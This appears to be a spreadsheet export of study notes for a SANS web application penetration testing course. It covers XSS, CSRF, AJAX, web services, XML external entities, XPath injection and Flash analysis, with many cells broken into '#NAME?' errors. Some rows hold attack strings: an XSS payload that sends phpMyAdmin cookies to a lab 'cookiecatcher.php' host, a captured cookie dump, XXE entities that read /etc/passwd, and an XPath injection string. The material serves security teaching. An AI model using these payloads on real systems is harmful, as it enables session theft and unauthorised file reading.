- Edit HTML (allows live editing of HTML, bypass form restrictions, view hidden forms)",3. Server-Side Disc.,3.2 Manual Verif.,B3P141,,,,,,sec542/3.2/index.htm#s81,,,,
S542-3.2.91,SEC542,XSS Scripting Exercise: Exploit Code,,,,,,"- In phpmyadmin URL, use the XSS code:
?index.php?lang=<script>var lo=document.location;document.location='//192.168.1.41/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>",3. Server-Side Disc.,3.2 Manual Verif.,B3P151,,,,,,sec542/3.2/index.htm#s91,,,,
S542-3.2.92,SEC542,XSS Scripting Exercise: Exploiting phpMyAdmin,,,,,,"- See the cookie captured by cookiecatcher.php:
?sec542@sec542:/usr/local/awstats/wwwroot/cgi-bin$ cat /tmp/cookiedump 
Recieved=/cookiecatcher.php?phpMyAdmin=8inQMTbNSkHoWyOfKpG7-DN46U8;%20phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bi%3A-1%3B%7D;%20phpbb2mysql_sid=c8eca014bb5ba0b3da1a09982e5f7450
",3. Server-Side Disc.,3.2 Manual Verif.,B3P152,,,,,,sec542/3.2/index.htm#s92,,,,
S542-3.2.93,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s93,,,,
S542-3.2.94,SEC542,Cross Site Request Forgery (CSRF),,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P154,,,,,,sec542/3.2/index.htm#s94,,,,
S542-3.2.95,SEC542,CSRF Attack Walkthrough,,,,,,"- Determine a link that initates a transaction that users predictable parameters
- Attacker posts the link on a site he controlled or force the user to the site through DNS poisoning
- Users logs into the application normally
- While the user is still logged in, he browses to the attacker link
- This link could be an image tag, iframe, CSS or JavaScript import, XMLHTTP
- This initiates a transaction as the victim
- The app isn't aware that the user didn't mean to submit the transaction",3. Server-Side Disc.,3.2 Manual Verif.,B3P155,,,,,,sec542/3.2/index.htm#s95,,,,
S542-3.2.73,SEC542,Parts of a XSS Attack (Illustrated),,,,,,- Illustration: Evil client --> Server --> Victim's browser,3. Server-Side Disc.,3.2 Manual Verif.,B3P133,,,,,,sec542/3.2/index.htm#s73,,,,
S542-3.2.87,SEC542,XSS Assistant,,,,,,"- Greasemonkey script to XSS attacks
- Menu to allow us to target forms
- Includes the XSS Cheatsheet from RSnake
- Drop downs to select attack vectors
- Don't use Generate PoC (link points to send to whiteacid.org)",3. Server-Side Disc.,3.2 Manual Verif.,B3P147,,,,,,sec542/3.2/index.htm#s87,,,,
S542-3.2.97,SEC542,CSRF Walkthrough (Illustrated),,,,,,"4. Victim connects to the attacker's web page on ""trusted server"" (while logged-in the vuln app)
5. The transaction is executed in the victim's browser and the request is sent to vuln. app
6. The vuln app processes the (attacker's) request coming from the victim browser",3. Server-Side Disc.,3.2 Manual Verif.,B3P157,,,,,,sec542/3.2/index.htm#s97,,,,
S542-3.2.96,SEC542,CSRF Walkthrough (Illustrated),,,,,,"1. Attacker finds a web app with a transaction with predictable parameters
2. Attacker builds a web page that contains a request to the vulnerable transaction
3. Attacker deposits the web page on a server that can control but that is trusted by end-users",3. Server-Side Disc.,3.2 Manual Verif.,B3P156,,,,,,sec542/3.2/index.htm#s96,,,,
S542-4.1.02,SEC542,Client-Side Vulnerability Discovery,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P06,,,,,,sec542/4.1/index.htm#s2,,,,
S542-4.1.03,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s3,,,,
S542-3.2.99,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s99,,,,
S542-4.1.05,SEC542,Mash-Ups,,,,,,"-  AJAX build mash-ups
- Combining 2 or more apps to provide more features
- SOP causes issues for these sites
- Proxy capability often used to enable mash-ups",4. Client-Side Disc.,4.1 AJAX,B4P09,,,,,,sec542/4.1/index.htm#s5,,,,
S542-3.2.98,SEC542,CSRF Detection,,,,,,"- No reliable tool to check that predictable parameters had the effect expected (of CSRF).
- Tools will detect URLs with predictable parameters but cannot validate the effect of a predictable request submitted",3. Server-Side Disc.,3.2 Manual Verif.,B3P158,,,,,,sec542/3.2/index.htm#s98,,,,
S542-4.1.01,SEC542,AJAX: Section Objectives,,,,,,"Familiarize with AJAX technology and how it changes the attack surface, Ajax Fundamentals (origin policy, mash ups, attack surface0, Logic Attacks, API Attacks, Data Binding Attacks (JSON), SprAJAX Basics, and RatProxy Basics.",4. Client-Side Disc.,4.1 AJAX,B4P05,,,,,,sec542/4.1/index.htm#s1,,,,
S542-4.1.04,SEC542,AJAX,,,,,,"- Async JavaScript and XML
- XMLHttpRequest object is the heart of it
- To build thick client functionality on the web
- Apps make requests without user interaction
- Who did the QA for this web 2.0 stuff?",4. Client-Side Disc.,4.1 AJAX,B4P08,,,,,,sec542/4.1/index.htm#s4,,,,
S542-4.1.06,SEC542,AJAX and SOP,,,,,,- AJAX doesn't change the SOP,4. Client-Side Disc.,4.1 AJAX,B4P10,,,,,,sec542/4.1/index.htm#s6,,,,
S542-4.1.07,SEC542,Mash-Up Proxy Features,,,,,,"- Typically use a proxy built into their apps
- Mash-up app is a proxy part of app (retrieves pages through it to bypass SOP). It becomes the server of origin.",4. Client-Side Disc.,4.1 AJAX,B4P11,,,,,,sec542/4.1/index.htm#s7,,,,
S542-4.1.08,SEC542,Mash-Up Proxy Issues,,,,,,"- Proxies commonly use GET or POST
- Main issue is control the URLs to proxy
- Attacks: proxy to attack or browser other sites; instruct proxy to load malicious JavaScript
- App may use a check string to prevent this attack (removing the check string may let you browse anywhere...)
- Check string for Mash-Up proxy issues",4. Client-Side Disc.,4.1 AJAX,B4P12,,,,,,sec542/4.1/index.htm#s8,,,,
S542-4.1.12,SEC542,AJAX Mapping,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P16,,,,,,sec542/4.1/index.htm#s12,,,,
S542-4.1.13,SEC542,AJAX Discovery,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P17,,,,,,sec542/4.1/index.htm#s13,,,,
S542-4.1.14,SEC542,AJAX Exploitation,,,,,,"- Exploitation is not more difficult
- Tools need to be ""primed"" (eg: SQLMap)",4. Client-Side Disc.,4.1 AJAX,B4P18,,,,,,sec542/4.1/index.htm#s14,,,,
S542-4.1.15,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s15,,,,
S542-4.1.16,SEC542,Logic Attacks,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P20,,,,,,sec542/4.1/index.htm#s16,,,,
S542-4.1.17,SEC542,Logic Attacks Example,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P21,,,,,,sec542/4.1/index.htm#s17,,,,
S542-4.1.18,SEC542,Logic Flaws: Discovery,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P22,,,,,,sec542/4.1/index.htm#s18,,,,
S542-4.1.19,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s19,,,,
S542-4.1.20,SEC542,API Attacks,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P24,,,,,,sec542/4.1/index.htm#s20,,,,
S542-4.1.09,SEC542,Cross-Site via Script Tag,,,,,,"- Sites now use the script tag (instead of proxy)
- Libraries use this technique (Google's Web Toolkit)
- Script tag on the host page, SOP doesn't block access to it
- Code on the page can then interact with its content
- Requires <script> tag to exist or be injected...
- Bypasses SOP by loading code through their own site ",4. Client-Side Disc.,4.1 AJAX,B4P13,,,,,,sec542/4.1/index.htm#s9,,,,
S542-4.1.10,SEC542,How does it work?,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P14,,,,,,sec542/4.1/index.htm#s10,,,,
S542-4.1.11,SEC542,AJAX Attack Surface,,,,,,"- Larger attack surface: large amounts of client code, business logic in the client
- Doesn't add new attacks. Typical attacks work (SQL Injection, XSS)
- AJAX architected to be vulnerable to CSRF",4. Client-Side Disc.,4.1 AJAX,B4P15,,,,,,sec542/4.1/index.htm#s11,,,,
S542-4.1.24,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s24,,,,
S542-4.1.22,SEC542,API Files: Discovery,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P26,,,,,,sec542/4.1/index.htm#s22,,,,
S542-4.1.26,SEC542,Data Formats,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P30,,,,,,sec542/4.1/index.htm#s26,,,,
S542-4.1.27,SEC542,JSON,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P31,,,,,,sec542/4.1/index.htm#s27,,,,
S542-4.1.28,SEC542,JSON Format,,,,,,"- An array of arrays
- [[""1"", ""Brenna"", ""8""],
   [""2"", ""Sarah"", ""3""],...]",4. Client-Side Disc.,4.1 AJAX,B4P32,,,,,,sec542/4.1/index.htm#s28,,,,
S542-4.1.29,SEC542,Exploiting JSON,,,,,,-  Takes 2 forms: Information Disclorure (easiest) and Injection...,4. Client-Side Disc.,4.1 AJAX,B4P33,,,,,,sec542/4.1/index.htm#s29,,,,
S542-4.1.21,SEC542,API Files,,,,,,"- Can be pulled down (.js files)
- View features we don't have access to",4. Client-Side Disc.,4.1 AJAX,B4P25,,,,,,sec542/4.1/index.htm#s21,,,,
S542-4.1.23,SEC542,API Flaws: Exploitation,,,,,,"- Takes many forms, depends on what's exposed
- Try calling functions w/o authentication
- Gather information for other exploits",4. Client-Side Disc.,4.1 AJAX,B4P27,,,,,,sec542/4.1/index.htm#s23,,,,
S542-4.1.25,SEC542,Data Attacks,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P29,,,,,,sec542/4.1/index.htm#s25,,,,
S542-4.1.31,SEC542,JSON Injection,,,,,,"- Focus on requests and intercept them to insert attack strings (javascript code
- Any attack can be useful but SQL Injection and XSS are the most common.
- Targets client or server code 
- Burp can reformat specific AJAX data
- Interception proxy may be where to get the results",4. Client-Side Disc.,4.1 AJAX,B4P35,,,,,,sec542/4.1/index.htm#s31,,,,
S542-4.1.34,SEC542,SprAJAX Usage,,,,,,- Requires MS SQL 2005 and .NET,4. Client-Side Disc.,4.1 AJAX,B4P38,,,,,,sec542/4.1/index.htm#s34,,,,
S542-4.1.35,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s35,,,,
S542-4.1.36,SEC542,RatProxy,,,,,,"- One of the teacher's favorite interception proxy
- Mostly passive proxy but can be active scanner
- http://code.google.com/p/ratproxy
- Runs on Linux/Mac/Windows
- Decompiles Flash objects",4. Client-Side Disc.,4.1 AJAX,B4P40,,,,,,sec542/4.1/index.htm#s36,,,,
S542-4.1.37,SEC542,RatProxy Execution,,,,,,"- Passive or Active scanning
- You can chain Burp and RatProxy. But don't launch a vulnerability scanner (it confuses it)",4. Client-Side Disc.,4.1 AJAX,B4P41,,,,,,sec542/4.1/index.htm#s37,,,,
S542-4.1.32,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s32,,,,
S542-4.1.33,SEC542,SprAJAX,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P37,,,,,,sec542/4.1/index.htm#s33,,,,
S542-4.1.30,SEC542,JSON Information Disclosure,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P34,,,,,,sec542/4.1/index.htm#s30,,,,
S542-4.1.38,SEC542,RatProxy Report,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P42,,,,,,sec542/4.1/index.htm#s38,,,,
S542-4.1.41,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s41,,,,
S542-4.1.43,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s43,,,,
S542-4.1.39,SEC542,RatProxy Log Viewing,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P43,,,,,,sec542/4.1/index.htm#s39,,,,
S542-4.1.40,SEC542,,,,,,,,4. Client-Side Disc.,4.1 AJAX,,,,,,,sec542/4.1/index.htm#s40,,,,
S542-4.1.44,SEC542,RatProxy Exercise: Browse the site,,,,,,#NAME?,4. Client-Side Disc.,4.1 AJAX,B4P48,,,,,,sec542/4.1/index.htm#s44,,,,
S542-4.1.42,SEC542,RatProxy Exercise: Launch,,,,,,?/usr/bin/samurai$ ./ratproxy -w ~/scanresults/ratproxy.log -v ~/scanresults/ratproxy/ -d sec542.org -xtfscgX,4. Client-Side Disc.,4.1 AJAX,B4P46,,,,,,sec542/4.1/index.htm#s42,,,,
S542-4.2.02,SEC542,Web Services,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P52,,,,,,sec542/4.2/index.htm#s2,,,,
S542-4.2.03,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s3,,,,
S542-4.2.04,SEC542,WebServices Definition Language (WSDL),,,,,,"- XML doc that describes the web service
- 3 topics covered: Description, location, methods how to invoke the service
- Find WSDL file on server, use UDDI
- Append the ?wsdl (lowercase or uppercase) to the URL for the web service and the server will send you the WSDL",4. Client-Side Disc.,4.2 Web Services,B4P54,,,,,,sec542/4.2/index.htm#s4,,,,
S542-4.2.05,SEC542,"Universal Description, Definition, Integration Spec. (UDDI)",,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P55,,,,,,sec542/4.2/index.htm#s5,,,,
S542-4.2.06,SEC542,Simple Object Access Protocol (SOAP),,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P56,,,,,,sec542/4.2/index.htm#s6,,,,
S542-4.2.07,SEC542,SOAP message parts,,,,,,"- <soap:Envelope...>, Header (Optional), <soap:Body...>
- Header: control information for the service
- Body: the message itself
- Envelope: addresses the messages",4. Client-Side Disc.,4.2 Web Services,B4P57,,,,,,sec542/4.2/index.htm#s7,,,,
S542-4.2.08,SEC542,Web Service Attacks,,,,,,"- Most web app attacks work: Cmd Injection, SQL Inj., Info. Disclosure
- Specific attacks: External Entity Attack, XPath Injection
- Attack's that don't work (usually): XSS, CSRF",4. Client-Side Disc.,4.2 Web Services,B4P59,,,,,,sec542/4.2/index.htm#s8,,,,
S542-4.2.09,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s9,,,,
S542-4.2.10,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s10,,,,
S542-4.2.11,SEC542,Entity,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P61,,,,,,sec542/4.2/index.htm#s11,,,,
S542-4.2.12,SEC542,How Entities works,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P62,,,,,,sec542/4.2/index.htm#s12,,,,
S542-4.2.13,SEC542,Entity Example,,,,,,"- Entities that provide shortcuts to hostnames
<!DOCTYPE interestingsites [
  <!ENTITY ISC ""isc.sans.org"">
  <!ENTITY PL ""portal.sans.org"">
]>
Referenced later by <host>&ISC;</host>",4. Client-Side Disc.,4.2 Web Services,B4P63,,,,,,sec542/4.2/index.htm#s13,,,,
S542-4.2.14,SEC542,External Entity (Attacks),,,,,,"- External entities allow for embedded docs
- Both remote and local docs
- Local: <!ENTITY pass SYSTEM ""/etc/passwd"">
  This tells the processor to take the system file and make it part of the response.
- Rmt: <!ENTITY intra SYSTEM ""http://intranet/index.html"">
  Surfing the web server via the web service",4. Client-Side Disc.,4.2 Web Services,B4P64,,,,,,sec542/4.2/index.htm#s14,,,,
S542-4.2.15,SEC542,XPath,,,,,,"- Query language for XML (data stores)
- Similar to SQL but no comments [injection possible], no user privileges
--> cmd injection has to work within the query",4. Client-Side Disc.,4.2 Web Services,B4P66,,,,,,sec542/4.2/index.htm#s15,,,,
S542-4.2.16,SEC542,XPath Basics,,,,,,"- XPath treats XMl as a tree
- Location paths /Org/Groups/Security
- Nodes referenced by /
- * is a wildcard",4. Client-Side Disc.,4.2 Web Services,B4P67,,,,,,sec542/4.2/index.htm#s16,,,,
S542-4.2.17,SEC542,XML File from a Phonebook,,,,,,"- See slide (XML tree with Groups, Security, Member, Name/Phone)",4. Client-Side Disc.,4.2 Web Services,B4P68,,,,,,sec542/4.2/index.htm#s17,,,,
S542-4.2.18,SEC542,XPath Queries,,,,,,"- Return all Group nodes: //Groups
- Return nodes with a condition (return members with names that start with Justin):
  /Groups/Security/Member/[Name=""Justin*""]",4. Client-Side Disc.,4.2 Web Services,B4P69,,,,,,sec542/4.2/index.htm#s18,,,,
S542-4.2.19,SEC542,XPath Injection,,,,,,"- XPath has to return true
- Expected: Brenna
- Attacker's: Brenna"" or """"=""
- Sometimes hard to know what to inject (even though a flaw could be found)",4. Client-Side Disc.,4.2 Web Services,B4P70,,,,,,sec542/4.2/index.htm#s19,,,,
S542-4.1.45,SEC542,RatProxy Exercise: Report Gen.,,,,,,"- Control-C to stop RatProxy before generating the report
- Generate the report:
  ?/usr/bin/samurai$ ./ratproxy-report.sh ~/scanresults/ratproxy.log > ~/Desktop/ratproxy.html
",4. Client-Side Disc.,4.1 AJAX,B4P49,,,,,,sec542/4.1/index.htm#s45,,,,
S542-4.1.46,SEC542,RatProxy Exercise: View Report,,,,,,"- Report sections: ?SQL code in query parameters, POST query with no XSRF protection, HTTP redirector, Confirmed XSS vectors, Bad caching headers, Bad or no charset declared for renderable file, MIME type mismatch on renderable file, Dynamic Javascript for direct inclusion, Cookie issuer with no XSRF protection, XSS candidates (script), Markup in dynamic Javascript, File name in query parameters, XSS candidates, Request splitting candidates, HTTP errors, GET query with no XSRF protection, File upload forms, Directory indexes, All cookie setting URLs, All POST requests,
",4. Client-Side Disc.,4.1 AJAX,B4P50,,,,,,sec542/4.1/index.htm#s46,,,,
S542-4.2.01,SEC542,Web Services: Section Objectives,,,,,,"Familiarize with web service technologies and attack vectors, Web Service Pieces (WDSL, UDDI, SOAP), External Entity Attacks, and XPATH basics and XPATH Injection.",4. Client-Side Disc.,4.2 Web Services,B4P51,,,,,,sec542/4.2/index.htm#s1,,,,
S542-4.2.20,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s20,,,,
S542-4.2.21,SEC542,SOAP Tools,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P72,,,,,,sec542/4.2/index.htm#s21,,,,
S542-4.2.22,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s22,,,,
S542-4.2.23,SEC542,WebScarab Web Services,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P74,,,,,,sec542/4.2/index.htm#s23,,,,
S542-4.2.24,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s24,,,,
S542-4.2.28,SEC542,WSDigger,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P79,,,,,,sec542/4.2/index.htm#s28,,,,
S542-4.2.29,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s29,,,,
S542-4.2.30,SEC542,Client Side Code Types,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P81,,,,,,sec542/4.2/index.htm#s30,,,,
S542-4.2.31,SEC542,Client Technologies,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P82,,,,,,sec542/4.2/index.htm#s31,,,,
S542-4.3.01,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s1,,,,
S542-4.3.02,SEC542,Flash: Section Objectives,,,,,,"Flash technology and its weaknesses, Flash technology basics, flash files, and ActionScript, Cross domain, ActionScript and HTTP, Flare Basics, and SWFIntruder Basics.",4. Client-Side Disc.,4.3 Flash,B4P84,,,,,,sec542/4.3/index.htm#s2,,,,
S542-4.3.03,SEC542,Flash Files,,,,,,"- Causes problems with automated tools
- .swf: compiled Flash object
- .flv: Flash video files
- .as: ActionScript code (similar to .js)",4. Client-Side Disc.,4.3 Flash,B4P85,,,,,,sec542/4.3/index.htm#s3,,,,
S542-4.3.04,SEC542,ActionScript,,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P86,,,,,,sec542/4.3/index.htm#s4,,,,
S542-4.3.05,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s5,,,,
S542-4.3.06,SEC542,Flash: Cross Domain,,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P88,,,,,,sec542/4.3/index.htm#s6,,,,
S542-4.3.07,SEC542,Cross Domain Policy,,,,,,"- Cross Domain Policy restrictions added in Flash 7
- Prevents loading data except from origin server (defaults to closed) - access control for other sites (from Flash player)
- Difference (to SOP) is that the CDP is controllable via  crossdomain.xml 
'- Controlled by sys admin or developer
- Add to web root of the web server (all or nothing approach to content)",4. Client-Side Disc.,4.3 Flash,B4P89,,,,,,sec542/4.3/index.htm#s7,,,,
S542-4.3.08,SEC542,Crossdomain.xml,,,,,,"- Placed at web root (or within dir  the content is loaded from)
- Controls which domains are able to access content from this server (for Flash only)
- Wildcards allowed (*.sec542.org)
- Flash config only (doesn't apply to JavaScript)",4. Client-Side Disc.,4.3 Flash,B4P90,,,,,,sec542/4.3/index.htm#s8,,,,
S542-4.3.09,SEC542,Crossdomain Controls,,,,,,"- 3 types of controls within crossdomain.xml (next slides): Site-Control, Allow-Access-From, Allow-HTTP-Request-Headers-From
- Can be used together or in combination
- Within <cross-domain-policy>...",4. Client-Side Disc.,4.3 Flash,B4P91,,,,,,sec542/4.3/index.htm#s9,,,,
S542-4.3.10,SEC542,Site-Control (cross domain control),,,,,,"- Sets control for domain
- Multiple controls available (none, master-only, by-content-type, by-ftp-filename, all)",4. Client-Side Disc.,4.3 Flash,B4P92,,,,,,sec542/4.3/index.htm#s10,,,,
S542-4.3.11,SEC542,Allow-Access-From,,,,,,"- Allow from all hosts in domain (*.sec542.org) 
  <cross-domain-policy> 
    <allow-access-from domain=""*.sec542.org""/>
  </cross-domain-policy>
- no hosts (exclude this tag, same as Javascript SOP) 
- all hosts <allow-access-from domain=""*"" />",4. Client-Side Disc.,4.3 Flash,B4P93,,,,,,sec542/4.3/index.htm#s11,,,,
S542-4.3.12,SEC542,Allow-HTTP-Request-Headers-From,,,,,,"- Other  (previous) policies control what can be pulled
- This one sets what can be pushed (via HTTP headers)
- <allow-http-request-headers domain=""sec542.org"" headers=""X-SessionID, Authorization""/>
- This allows a SWF file hosted in sec542.org to push the Authorization and/or X-SessionID header ",4. Client-Side Disc.,4.3 Flash,B4P94,,,,,,sec542/4.3/index.htm#s12,,,,
S542-4.3.13,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s13,,,,
S542-4.3.14,SEC542,Flash and HTTP,,,,,,"- HTTP requests are one the major Flash features from a Pentester's focus (besides hardcoded passwords...)
- Done via ActionScript",4. Client-Side Disc.,4.3 Flash,B4P96,,,,,,sec542/4.3/index.htm#s14,,,,
S542-4.2.25,SEC542,WebService Studio,,,,,,#NAME?,4. Client-Side Disc.,4.2 Web Services,B4P76,,,,,,sec542/4.2/index.htm#s25,,,,
S542-4.2.26,SEC542,WebService Studio Notes,,,,,,"- Usable for pen testing (but no cool attack strings or automated attacks). But since it's built for developers, it's easy to perform the attack.",4. Client-Side Disc.,4.2 Web Services,B4P77,,,,,,sec542/4.2/index.htm#s26,,,,
S542-4.2.27,SEC542,,,,,,,,4. Client-Side Disc.,4.2 Web Services,,,,,,,sec542/4.2/index.htm#s27,,,,
S542-4.3.15,SEC542,ActionScript to perform an HTTP Get,,,,,,"- req.send(""http://..."", ""_blank"", ""GET"");
- o_blank is in which Canvas",4. Client-Side Disc.,4.3 Flash,B4P97,,,,,,sec542/4.3/index.htm#s15,,,,
S542-4.3.16,SEC542,ActionScript to Perform an HTTP Post,,,,,,"- req.decode(""id=42"");  encodes this into the request payload
- req.send(""http://..."", ""_blank"", ""POST"");
- req.decode handles the  POST payload",4. Client-Side Disc.,4.3 Flash,B4P98,,,,,,sec542/4.3/index.htm#s16,,,,
S542-4.3.17,SEC542,Adding headers to HTTP request,,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P99,,,,,,sec542/4.3/index.htm#s17,,,,
S542-4.3.18,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s18,,,,
S542-4.3.19,SEC542,Flare,,,,,,"- Decompiling is the easiest way to analyze Flash
- From nowrap.de
- Gives the ActionScript
- RatProxy uses Flare to extract Flash
- Has problems with ActionScript 3 (newer version, not a real problem yet)",4. Client-Side Disc.,4.3 Flash,B4P101,,,,,,sec542/4.3/index.htm#s19,,,,
S542-4.3.23,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s23,,,,
S542-4.3.24,SEC542,Flare Exercise: Run,,,,,,- cd $HOME/swfs; flare sec542.swf; vi sec542.flr,4. Client-Side Disc.,4.3 Flash,B4P106,,,,,,sec542/4.3/index.htm#s24,,,,
S542-4.3.25,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s25,,,,
S542-4.3.26,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s26,,,,
S542-4.3.27,SEC542,SWFScan,,,,,,"- From HP, runs on Windows, requires sign-up for download
- Requires ActionScript 2 and 3
- Decompiles SWF for evaluation and allows source export
- Analyzes the source agains Adobe security best practices (XSS, hardcoded usernames/passwords...)",4. Client-Side Disc.,4.3 Flash,B4P109,,,,,,sec542/4.3/index.htm#s27,,,,
S542-4.3.28,SEC542,HP SWFScan,,,,,,"- Function Listing, Analysis of code
- Teacher doesn't use it. He uses Flare and something called Sothink SWF Decompiler ($80)",4. Client-Side Disc.,4.3 Flash,B4P110,,,,,,sec542/4.3/index.htm#s28,,,,
S542-4.3.29,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s29,,,,
S542-4.3.30,SEC542,SWFIntruder,,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P112,,,,,,sec542/4.3/index.htm#s30,,,,
S542-4.3.31,SEC542,SWFIntruder Features,,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P113,,,,,,sec542/4.3/index.htm#s31,,,,
S542-4.3.32,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s32,,,,
S542-4.3.33,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s33,,,,
S542-4.3.34,SEC542,SWFIntruder Exercise: Launch Firefox,,,,,,"- With Firefox, go to ?http://www.sec542.org/swfintruder/",4. Client-Side Disc.,4.3 Flash,B4P116,,,,,,sec542/4.3/index.htm#s34,,,,
S542-4.3.21,SEC542,Flare (running),,,,,,- Writes to the same file but adds the .flr extension,4. Client-Side Disc.,4.3 Flash,B4P103,,,,,,sec542/4.3/index.htm#s21,,,,
S542-4.3.36,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s36,,,,
S542-4.3.37,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s37,,,,
S542-4.3.20,SEC542,Flare (what it does),,,,,,#NAME?,4. Client-Side Disc.,4.3 Flash,B4P102,,,,,,sec542/4.3/index.htm#s20,,,,
S542-4.4.02,SEC542,Java Applets,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P121,,,,,,sec542/4.4/index.htm#s2,,,,
S542-4.4.03,SEC542,Loading Applets,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P122,,,,,,sec542/4.4/index.htm#s3,,,,
S542-4.4.04,SEC542,Parameters,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P123,,,,,,sec542/4.4/index.htm#s4,,,,
S542-4.4.05,SEC542,Applets and Scripting,,,,,,#NAME?,4. Client-Side Disc.,4.4 Java Applets,B4P124,,,,,,sec542/4.4/index.htm#s5,,,,
S542-4.4.06,SEC542,,,,,,,,4. Client-Side Disc.,4.4 Java Applets,,,,,,,sec542/4.4/index.htm#s6,,,,
S542-4.4.07,SEC542,Class Files,,,,,,"- Compiled bytecode in .class file
- What's used for analysis ",4. Client-Side Disc.,4.4 Java Applets,B4P126,,,,,,sec542/4.4/index.htm#s7,,,,
S542-4.3.22,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s22,,,,
S542-4.3.35,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,,sec542/4.3/index.htm#s35,,,,
S542-4.4.01,SEC542,Java Applets: Section Objectives,,,,,,"Fundamentals of Java Applets and how to decopile them, as well as Applet basics, Class files, and JAD Decompiler.",4. Client-Side Disc.,4.4 Java Applets,B4P120,,,,,,sec542/4.4/index.htm#s1,,,,
S542-4.4.08,SEC542,Points of interest in Classes,,,,,,"- Decompile class files as part of pentest
- Source can be examined for interesting code (HTTP calls, input processing, authentication features, hardcoded usernames/passwords)",4. Client-Side Disc.,4.4 Java Applets,B4P127,,,,,,sec542/4.4/index.htm#s8,,,,
